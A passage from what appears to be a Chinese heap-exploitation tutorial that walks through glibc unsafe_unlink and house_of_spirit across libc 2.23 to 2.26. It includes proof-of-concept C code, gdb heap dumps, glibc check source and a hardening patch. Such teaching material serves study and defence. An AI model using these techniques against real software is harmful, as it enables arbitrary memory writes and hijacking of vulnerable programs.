unlink\u3002\u8be5\u6280\u672f\u6700\u5e38\u89c1\u7684\u5229\u7528\u573a\u666f\u662f\u6211\u4eec\u6709\u4e00\u4e2a\u53ef\u4ee5\u6ea2\u51fa\u6f0f\u6d1e\u548c\u4e00\u4e2a\u5168\u5c40\u6307\u9488\u3002 Ubuntu16.04 \u4f7f\u7528 libc-2.23\uff0c\u5176\u4e2d unlink \u5b9e\u73b0\u7684\u4ee3\u7801\u5982\u4e0b\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u5bf9\u524d\u540e\u5806\u5757\u7684\u68c0\u67e5\uff0c\u4e5f\u662f\u6211\u4eec\u9700\u8981\u7ed5\u8fc7\u7684\uff1a /* Take a chunk off a bin list */ #define unlink(AV, P, BK, FD) { \\ FD = P->fd; \\ BK = P->bk; \\ if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ else { \\ FD->bk = BK; \\ BK->fd = FD; \\ if (!in_smallbin_range (P->size) \\ && __builtin_expect (P->fd_nextsize != NULL, 0)) { \\ if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \\ || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \\ if (FD->fd_nextsize == NULL) { \\ if (P->fd_nextsize == P) \\ FD->fd_nextsize = FD->bk_nextsize = FD; \\ else { \\ FD->fd_nextsize = P->fd_nextsize; \\ FD->bk_nextsize = P->bk_nextsize; \\ P->fd_nextsize->bk_nextsize = FD; \\ P->bk_nextsize->fd_nextsize = FD; \\ } \\ } else { \\ P->fd_nextsize->bk_nextsize = P->bk_nextsize; \\ P->bk_nextsize->fd_nextsize = P->fd_nextsize; \\ } \\ } \\ } \\ } \u5728\u89e3\u94fe\u64cd\u4f5c\u4e4b\u524d\uff0c\u9488\u5bf9\u5806\u5757 P \u81ea\u8eab\u7684 fd \u548c bk \u68c0\u67e5\u4e86\u94fe\u8868\u7684\u5b8c\u6574\u6027\uff0c\u5373\u5224\u65ad\u5806\u5757 P \u7684\u524d\u4e00\u5757 fd \u7684\u6307\u9488\u662f\u5426\u6307\u5411 P\uff0c\u4ee5\u53ca\u540e\u4e00\u5757 bk \u7684\u6307\u9488\u662f\u5426\u6307\u5411 P\u3002 malloc_size \u8bbe\u7f6e\u4e3a 0x80\uff0c\u53ef\u4ee5\u5206\u914d small chunk\uff0c\u7136\u540e\u5b9a\u4e49 header_size \u4e3a 2\u3002\u7533\u8bf7\u4e24\u5757\u7a7a\u95f4\uff0c\u5168\u5c40\u6307\u9488 chunk0_ptr \u6307\u5411 chunk0\uff0c\u5c40\u90e8\u6307\u9488 chunk1_ptr \u6307\u5411 chunk1\uff1a gef\u27a4 p &chunk0_ptr $1 = (uint64_t **) 0x601070 <chunk0_ptr> gef\u27a4 x/gx &chunk0_ptr 0x601070 <chunk0_ptr>: 0x0000000000602010 gef\u27a4 p &chunk1_ptr $2 = (uint64_t **) 0x7fffffffdc60 gef\u27a4 x/gx &chunk1_ptr 0x7fffffffdc60: 0x00000000006020a0 gef\u27a4 x/40gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 0 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000091 <-- chunk 1 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000000000 0x6020e0: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x0000000000000000 0x602100: 0x0000000000000000 0x0000000000000000 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000020ee1 <-- top chunk 0x602130: 0x0000000000000000 0x0000000000000000 \u63a5\u4e0b\u6765\u8981\u7ed5\u8fc7 (P->fd->bk != P || P->bk->fd != P) == False \u7684\u68c0\u67e5\uff0c\u8fd9\u4e2a\u68c0\u67e5\u6709\u4e2a\u7f3a\u9677\uff0c\u5c31\u662f fd/bk \u6307\u9488\u90fd\u662f\u901a\u8fc7\u4e0e chunk \u5934\u90e8\u7684\u76f8\u5bf9\u5730\u5740\u6765\u67e5\u627e\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5168\u5c40\u6307\u9488 chunk0_ptr \u6784\u9020 fake chunk \u6765\u7ed5\u8fc7\u5b83\uff1a gef\u27a4 x/40gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 0 0x602010: 0x0000000000000000 0x0000000000000000 <-- fake chunk P 0x602020: 0x0000000000601058 0x0000000000601060 <-- fd, bk pointer 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000080 0x0000000000000090 <-- chunk 1 <-- prev_size 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000000000 0x6020e0: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x0000000000000000 0x602100: 0x0000000000000000 0x0000000000000000 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000020ee1 <-- top chunk 0x602130: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/5gx 0x601058 0x601058: 0x0000000000000000 0x00007ffff7dd2540 <-- fake chunk FD 0x601068: 0x0000000000000000 0x0000000000602010 <-- bk pointer 0x601078: 0x0000000000000000 gef\u27a4 x/5gx 0x601060 0x601060: 0x00007ffff7dd2540 0x0000000000000000 <-- fake chunk BK 0x601070: 0x0000000000602010 0x0000000000000000 <-- fd pointer 0x601080: 0x0000000000000000 \u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u5728 chunk0 \u91cc\u6784\u9020\u4e00\u4e2a fake chunk\uff0c\u7528 P \u8868\u793a\uff0c\u4e24\u4e2a\u6307\u9488 fd \u548c bk \u53ef\u4ee5\u6784\u6210\u4e24\u6761\u94fe\uff1a P->fd->bk == P \uff0c P->bk->fd == P \uff0c\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u67e5\u3002\u53e6\u5916\u5229\u7528 chunk0 \u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u901a\u8fc7\u4fee\u6539 chunk 1 \u7684 prev_size \u4e3a fake chunk \u7684\u5927\u5c0f\uff0c\u4fee\u6539 PREV_INUSE \u6807\u5fd7\u4f4d\u4e3a 0\uff0c\u5c06 fake chunk \u4f2a\u9020\u6210\u4e00\u4e2a free chunk\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u91ca\u653e\u6389 chunk1\uff0c\u8fd9\u4f1a\u89e6\u53d1 fake chunk \u7684 unlink \u5e76\u8986\u76d6 chunk0_ptr \u7684\u503c\u3002unlink \u64cd\u4f5c\u662f\u8fd9\u6837\u8fdb\u884c\u7684\uff1a FD = P->fd; BK = P->bk; FD->bk = BK BK->fd = FD \u6839\u636e fd \u548c bk \u6307\u9488\u5728 malloc_chunk \u7ed3\u6784\u4f53\u4e2d\u7684\u4f4d\u7f6e\uff0c\u8fd9\u6bb5\u4ee3\u7801\u7b49\u4ef7\u4e8e\uff1a FD = P->fd = &P - 24 BK = P->bk = &P - 16 FD->bk = *(&P - 24 + 24) = P FD->fd = *(&P - 16 + 16) = P \u8fd9\u6837\u5c31\u901a\u8fc7\u4e86 unlink \u7684\u68c0\u67e5\uff0c\u6700\u7ec8\u6548\u679c\u4e3a\uff1a FD->bk = P = BK = &P - 16 BK->fd = P = FD = &P - 24 \u539f\u672c\u6307\u5411\u5806\u4e0a fake chunk \u7684\u6307\u9488 P \u6307\u5411\u4e86\u81ea\u8eab\u5730\u5740\u51cf 24 \u7684\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5982\u679c\u7a0b\u5e8f\u529f\u80fd\u5141\u8bb8\u5806 P \u8fdb\u884c\u5199\u5165\uff0c\u5c31\u80fd\u6539\u5199 P \u6307\u9488\u81ea\u8eab\u7684\u5730\u5740\uff0c\u4ece\u800c\u9020\u6210\u4efb\u610f\u5185\u5b58\u5199\u5165\u3002\u82e5\u5141\u8bb8\u5806 P \u8fdb\u884c\u8bfb\u53d6\uff0c\u5219\u4f1a\u9020\u6210\u4fe1\u606f\u6cc4\u6f0f\u3002 \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7531\u4e8e P->fd->bk \u548c P->bk->fd \u90fd\u6307\u5411 P\uff0c\u6240\u4ee5\u6700\u540e\u7684\u7ed3\u679c\u4e3a\uff1a chunk0_ptr = P = P->fd \u6210\u529f\u5730\u4fee\u6539\u4e86 chunk0_ptr\uff0c\u8fd9\u65f6 chunk0_ptr \u548c chunk0_ptr[3] \u5b9e\u9645\u4e0a\u5c31\u662f\u540c\u4e00\u4e1c\u897f\u3002\u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u7591\u60d1\u4e3a\u4ec0\u4e48\u8fd9\u4e24\u4e2a\u4e1c\u897f\u662f\u4e00\u6837\u7684\uff0c\u56e0\u4e3a chunk0_ptr \u6307\u9488\u5728\u662f\u653e\u5728\u6570\u636e\u6bb5\u4e0a\u7684\uff0c\u5730\u5740\u5728 0x601070 \uff0c\u6307\u5411 0x601058 \uff0c\u800c chunk0_ptr[3] \u7684\u610f\u601d\u662f\u4ece chunk0_ptr \u6307\u5411\u7684\u5730\u65b9\u5f00\u59cb\u6570 3 \u4e2a\u5355\u4f4d\uff0c\u6240\u4ee5 0x601058+0x08*3=0x601070 \uff1a gef\u27a4 x/40gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 0 0x602010: 0x0000000000000000 0x0000000000020ff1 <-- fake chunk P 0x602020: 0x0000000000601058 0x0000000000601060 <-- fd, bk pointer 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000080 0x0000000000000090 <-- chunk 1 [be freed] 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000000000 0x6020e0: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x0000000000000000 0x602100: 0x0000000000000000 0x0000000000000000 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000020ee1 <-- top chunk 0x602130: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/5gx 0x601058 0x601058: 0x0000000000000000 0x00007ffff7dd2540 <-- fake chunk FD 0x601068: 0x0000000000000000 0x0000000000601058 <-- bk pointer 0x601078: 0x0000000000000000 gef\u27a4 x/5gx 0x601060 0x601060: 0x00007ffff7dd2540 0x0000000000000000 <-- fake chunk BK 0x601070: 0x0000000000601058 0x0000000000000000 <-- fd pointer 0x601080: 0x0000000000000000 gef\u27a4 x/gx chunk0_ptr 0x601058: 0x0000000000000000 gef\u27a4 x/gx chunk0_ptr[3] 0x601058: 0x0000000000000000 \u6240\u4ee5\uff0c\u4fee\u6539 chunk0_ptr[3] \u5c31\u7b49\u4e8e\u4fee\u6539 chunk0_ptr \uff1a gef\u27a4 x/5gx 0x601058 0x601058: 0x0000000000000000 0x00007ffff7dd2540 0x601068: 0x0000000000000000 0x00007fffffffdc70 <-- chunk0_ptr[3] 0x601078: 0x0000000000000000 gef\u27a4 x/gx chunk0_ptr 0x7fffffffdc70: 0x4141414141414141 \u8fd9\u65f6 chunk0_ptr \u5c31\u6307\u5411\u4e86 victim_string\uff0c\u4fee\u6539\u5b83\uff1a gef\u27a4 x/gx chunk0_ptr 0x7fffffffdc70: 0x4242424242424242 \u6210\u529f\u8fbe\u6210\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u6210\u5c31\u3002 \u6700\u540e\u770b\u4e00\u70b9\u65b0\u7684\u4e1c\u897f\uff0clibc-2.25 \u5728 unlink \u7684\u5f00\u5934\u589e\u52a0\u4e86\u5bf9 chunk_size == next->prev->chunk_size \u7684\u68c0\u67e5\uff0c\u4ee5\u5bf9\u6297\u5355\u5b57\u8282\u6ea2\u51fa\u7684\u95ee\u9898\u3002\u8865\u4e01\u5982\u4e0b\uff1a $ git show 17f487b7afa7cd6c316040f3e6c86dc96b2eec30 malloc/malloc.c commit 17f487b7afa7cd6c316040f3e6c86dc96b2eec30 Author: DJ Delorie <dj@delorie.com> Date: Fri Mar 17 15:31:38 2017 -0400 Further harden glibc malloc metadata against 1-byte overflows. Additional check for chunk_size == next->prev->chunk_size in unlink() 2017-03-17 Chris Evans <scarybeasts@gmail.com> * malloc/malloc.c (unlink): Add consistency check between size and next->prev->size, to further harden against 1-byte overflows. diff --git a/malloc/malloc.c b/malloc/malloc.c index e29105c372..994a23248e 100644 --- a/malloc/malloc.c +++ b/malloc/malloc.c @@ -1376,6 +1376,8 @@ typedef struct malloc_chunk *mbinptr; /* Take a chunk off a bin list */ #define unlink(AV, P, BK, FD) { \\ + if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ + malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV); \\ FD = P->fd; \\ BK = P->bk; \\ if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ \u5177\u4f53\u662f\u8fd9\u6837\u7684\uff1a /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p))) /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Bits to mask off when extracting size */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) \u56de\u987e\u4e00\u4e0b\u4f2a\u9020\u51fa\u6765\u7684\u5806\uff1a gef\u27a4 x/40gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 0 0x602010: 0x0000000000000000 0x0000000000000000 <-- fake chunk P 0x602020: 0x0000000000601058 0x0000000000601060 <-- fd, bk pointer 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000080 0x0000000000000090 <-- chunk 1 <-- prev_size 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000000000 0x6020e0: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x0000000000000000 0x602100: 0x0000000000000000 0x0000000000000000 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000020ee1 <-- top chunk 0x602130: 0x0000000000000000 0x0000000000000000 \u8fd9\u91cc\u6709\u4e09\u79cd\u529e\u6cd5\u53ef\u4ee5\u7ed5\u8fc7\u8be5\u68c0\u67e5\uff1a \u4ec0\u4e48\u90fd\u4e0d\u505a\u3002 chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x0 prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x0) == 0x0 \u8bbe\u7f6e chunk0_ptr[1] = 0x8 \u3002 chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x8 prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x8) == 0x8 \u8bbe\u7f6e chunk0_ptr[1] = 0x80 \u3002 chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x80 prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x80) == 0x80 \u597d\u7684\uff0c\u73b0\u5728 libc-2.25 \u7248\u672c\u4e0b\u6211\u4eec\u4e5f\u80fd\u6210\u529f\u5229\u7528\u4e86\u3002\u63a5\u4e0b\u6765\u66f4\u8fd1\u4e00\u6b65\uff0clibc-2.26 \u600e\u4e48\u5229\u7528\uff0c\u9996\u5148\u5f53\u7136\u8981\u5148\u77e5\u9053\u5b83\u65b0\u589e\u4e86\u54ea\u4e9b\u6f0f\u6d1e\u7f13\u89e3\u63aa\u65bd\uff0c\u5176\u4e2d\u4e00\u4e2a\u795e\u5947\u7684\u4e1c\u897f\u53eb\u505a tcache\uff0c\u8fd9\u662f\u4e00\u79cd\u7ebf\u7a0b\u7f13\u5b58\u673a\u5236\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6709 64 \u4e2a\u5927\u5c0f\u9012\u589e\u7684 bins\uff0c\u6bcf\u4e2a bin \u662f\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u9ed8\u8ba4\u6700\u591a\u5305\u542b 7 \u4e2a chunk\u3002\u5176\u4e2d\u7f13\u5b58\u7684 chunk \u662f\u4e0d\u4f1a\u88ab\u5408\u5e76\u7684\uff0c\u6240\u4ee5\u5728\u91ca\u653e chunk 1 \u7684\u65f6\u5019\uff0c chunk0_ptr \u4ecd\u7136\u6307\u5411\u6b63\u786e\u7684\u5806\u5730\u5740\uff0c\u800c\u4e0d\u662f\u4e4b\u524d\u7684 chunk0_ptr = P = P->fd \u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e00\u79cd\u53ef\u80fd\u7684\u529e\u6cd5\u662f\u7ed9\u586b\u5145\u8fdb\u7279\u5b9a\u5927\u5c0f\u7684 chunk \u628a bin \u5360\u6ee1\uff0c\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a // deal with tcache int *a[10]; int i; for (i = 0; i < 7; i++) { a[i] = malloc(0x80); } for (i = 0; i < 7; i++) { free(a[i]); } gef\u27a4 p &chunk0_ptr $2 = (uint64_t **) 0x555555755070 <chunk0_ptr> gef\u27a4 x/gx 0x555555755070 0x555555755070 <chunk0_ptr>: 0x00007fffffffdd0f gef\u27a4 x/gx 0x00007fffffffdd0f 0x7fffffffdd0f: 0x4242424242424242 \u73b0\u5728 libc-2.26 \u7248\u672c\u4e0b\u4e5f\u6210\u529f\u5229\u7528\u4e86\u3002tcache \u662f\u4e2a\u5f88\u6709\u8da3\u7684\u4e1c\u897f\uff0c\u66f4\u8be6\u7ec6\u7684\u5185\u5bb9\u6211\u4eec\u4f1a\u5728\u4e13\u95e8\u7684\u7ae0\u8282\u91cc\u53bb\u8bb2\u3002 \u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff0c\u53ef\u4ee5\u770b\u5230 heap-buffer-overflow\uff1a $ gcc -fsanitize=address -g unsafe_unlink.c $ ./a.out The global chunk0_ptr is at 0x602230, pointing to 0x60c00000bf80 The victim chunk we are going to corrupt is at 0x60c00000bec0 Fake chunk fd: 0x602218 Fake chunk bk: 0x602220 ================================================================= ==5591==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60c00000beb0 at pc 0x000000400d74 bp 0x7ffd06423730 sp 0x7ffd06423720 WRITE of size 8 at 0x60c00000beb0 thread T0 #0 0x400d73 in main /home/firmy/how2heap/unsafe_unlink.c:26 #1 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #2 0x400968 in _start (/home/firmy/how2heap/a.out+0x400968) 0x60c00000beb0 is located 16 bytes to the left of 128-byte region [0x60c00000bec0,0x60c00000bf40) allocated by thread T0 here: #0 0x7fc9261c4602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602) #1 0x400b12 in main /home/firmy/how2heap/unsafe_unlink.c:13 #2 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) house_of_spirit #include <stdio.h> #include <stdlib.h> int main() { malloc(1); fprintf(stderr, \"We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.\\n\"); unsigned long long *a, *b; unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, \"The first one: %p\\n\", &fake_chunks[0]); fprintf(stderr, \"The second one: %p\\n\", &fake_chunks[4]); fake_chunks[1] = 0x20; // the size fake_chunks[5] = 0x1234; // nextsize fake_chunks[2] = 0x4141414141414141LL; fake_chunks[6] = 0x4141414141414141LL; fprintf(stderr, \"Overwritting our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &fake_chunks[0]); a = &fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &fake_chunks[0], &fake_chunks[2]); b = malloc(0x10); fprintf(stderr, \"malloc(0x10): %p\\n\", b); b[0] = 0x4242424242424242LL; } $ gcc -g house_of_spirit.c $ ./a.out We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks. The first one: 0x7ffc782dae00 The second one: 0x7ffc782dae20 Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffc782dae00. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffc782dae00, which will be 0x7ffc782dae10! malloc(0x10): 0x7ffc782dae10 house-of-spirit \u662f\u4e00\u79cd fastbins \u653b\u51fb\u65b9\u6cd5\uff0c\u901a\u8fc7\u6784\u9020 fake chunk\uff0c\u7136\u540e\u5c06\u5176 free \u6389\uff0c\u5c31\u53ef\u4ee5\u5728\u4e0b\u4e00\u6b21 malloc \u65f6\u8fd4\u56de fake chunk \u7684\u5730\u5740\uff0c\u5373\u4efb\u610f\u6211\u4eec\u53ef\u63a7\u7684\u533a\u57df\u3002house-of-spirit \u662f\u4e00\u79cd\u901a\u8fc7\u5806\u7684 fast bin \u673a\u5236\u6765\u8f85\u52a9\u6808\u6ea2\u51fa\u7684\u65b9\u6cd5\uff0c\u4e00\u822c\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u5229\u7528\u90fd\u5e0c\u671b\u80fd\u591f\u8986\u76d6\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4ee5\u63a7\u5236 EIP \u6765\u52ab\u6301\u63a7\u5236\u6d41\uff0c\u4f46\u5982\u679c\u6808\u6ea2\u51fa\u7684\u957f\u5ea6\u65e0\u6cd5\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u540c\u65f6\u5374\u53ef\u4ee5\u8986\u76d6\u6808\u4e0a\u7684\u4e00\u4e2a\u5373\u5c06\u88ab free \u7684\u5806\u6307\u9488\uff0c\u6b64\u65f6\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u6307\u9488\u6539\u5199\u4e3a\u6808\u4e0a\u7684\u5730\u5740\u5e76\u5728\u76f8\u5e94\u4f4d\u7f6e\u6784\u9020\u4e00\u4e2a fast bin \u5757\u7684\u5143\u6570\u636e\uff0c\u63a5\u7740\u5728 free \u64cd\u4f5c\u65f6\uff0c\u8fd9\u4e2a\u6808\u4e0a\u7684\u5806\u5757\u88ab\u653e\u5230 fast bin \u4e2d\uff0c\u4e0b\u4e00\u6b21 malloc \u5bf9\u5e94\u7684\u5927\u5c0f\u65f6\uff0c\u7531\u4e8e fast bin \u7684\u5148\u8fdb\u540e\u51fa\u673a\u5236\uff0c\u8fd9\u4e2a\u6808\u4e0a\u7684\u5806\u5757\u88ab\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u518d\u6b21\u5199\u5165\u65f6\u5c31\u53ef\u80fd\u9020\u6210\u8fd4\u56de\u5730\u5740\u7684\u6539\u5199\u3002\u6240\u4ee5\u5229\u7528\u7684\u7b2c\u4e00\u6b65\u4e0d\u662f\u53bb\u63a7\u5236\u4e00\u4e2a chunk\uff0c\u800c\u662f\u63a7\u5236\u4f20\u7ed9 free \u51fd\u6570\u7684\u6307\u9488\uff0c\u5c06\u5176\u6307\u5411\u4e00\u4e2a fake chunk\u3002\u6240\u4ee5 fake chunk \u7684\u4f2a\u9020\u662f\u5173\u952e\u3002 \u9996\u5148 malloc(1) \u7528\u4e8e\u521d\u59cb\u5316\u5185\u5b58\u73af\u5883\uff0c\u7136\u540e\u5728 fake chunk \u533a\u57df\u4f2a\u9020\u51fa\u4e24\u4e2a chunk\u3002\u53e6\u5916\u6b63\u5982\u4e0a\u9762\u6240\u8bf4\u7684\uff0c\u9700\u8981\u4e00\u4e2a\u4f20\u9012\u7ed9 free \u51fd\u6570\u7684\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u6307\u9488\uff0c\u65e0\u8bba\u662f\u901a\u8fc7\u6808\u6ea2\u51fa\u8fd8\u662f\u5176\u5b83\u4ec0\u4e48\u65b9\u5f0f\uff1a gef\u27a4 x/10gx &fake_chunks 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000020 <-- fake chunk 1 0x7fffffffdcc0: 0x4141414141414141 0x0000000000000000 0x7fffffffdcd0: 0x0000000000000001 0x0000000000001234 <-- fake chunk 2 0x7fffffffdce0: 0x4141414141414141 0x0000000000000000 gef\u27a4 x/gx &a 0x7fffffffdca0: 0x0000000000000000 \u4f2a\u9020 chunk \u65f6\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u68c0\u67e5\uff0c\u9996\u5148\u662f\u6807\u5fd7\u4f4d\uff0c PREV_INUSE \u4f4d\u5e76\u4e0d\u5f71\u54cd free \u7684\u8fc7\u7a0b\uff0c\u4f46 IS_MMAPPED \u4f4d\u548c NON_MAIN_ARENA \u4f4d\u90fd\u8981\u4e3a\u96f6\u3002\u5176\u6b21\uff0c\u5728 64 \u4f4d\u7cfb\u7edf\u4e2d fast chunk \u7684\u5927\u5c0f\u8981\u5728 32~128 \u5b57\u8282\u4e4b\u95f4\u3002\u6700\u540e\uff0c\u662f next chunk \u7684\u5927\u5c0f\uff0c\u5fc5\u987b\u5927\u4e8e 2*SIZE_SZ \uff08\u5373\u5927\u4e8e16\uff09\uff0c\u5c0f\u4e8e av->system_mem \uff08\u5373\u5c0f\u4e8e128kb\uff09\uff0c\u624d\u80fd\u7ed5\u8fc7\u5bf9 next chunk \u5927\u5c0f\u7684\u68c0\u67e5\u3002 libc-2.23 \u4e2d\u8fd9\u4e9b\u68c0\u67e5\u4ee3\u7801\u5982\u4e0b\uff1a void __libc_free (void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ [...] p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ { [...] munmap_chunk (p); return; } ar_ptr = arena_for_chunk (p); // \u83b7\u5f97 chunk \u6240\u5c5e arena \u7684\u5730\u5740 _int_free (ar_ptr, p, 0); // \u5f53 IS_MMAPPED \u4e3a\u96f6\u65f6\u8c03\u7528 } mem \u5c31\u662f\u6211\u4eec\u6240\u63a7\u5236\u7684\u4f20\u9012\u7ed9 free \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u4e2d\u4e0b\u9762\u4e24\u4e2a\u51fd\u6570\u7528\u4e8e\u5728 chunk \u6307\u9488\u548c malloc \u6307\u9488\u4e4b\u95f4\u505a\u8f6c\u6362\uff1a /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ)) \u5f53 NON_MAIN_ARENA \u4e3a\u96f6\u65f6\u8fd4\u56de main arena\uff1a /* find the heap and corresponding arena for a given ptr */ #define heap_for_ptr(ptr) \\ ((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE - 1))) #define arena_for_chunk(ptr) \\ (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena) \u8fd9\u6837\uff0c\u7a0b\u5e8f\u5c31\u987a\u5229\u5730\u8fdb\u5165\u4e86 _int_free \u51fd\u6570\uff1a static void _int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ [...] size = chunksize (p); [...] /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if ((unsigned long)(size) <= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ && (chunk_at_offset(p, size) != av->top) #endif ) { if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)) { [...] errstr = \"free(): invalid next size (fast)\"; goto errout; } [...] set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &fastbin (av, idx); /* Atomically link P to its fastbin: P->FD = *FB; *FB 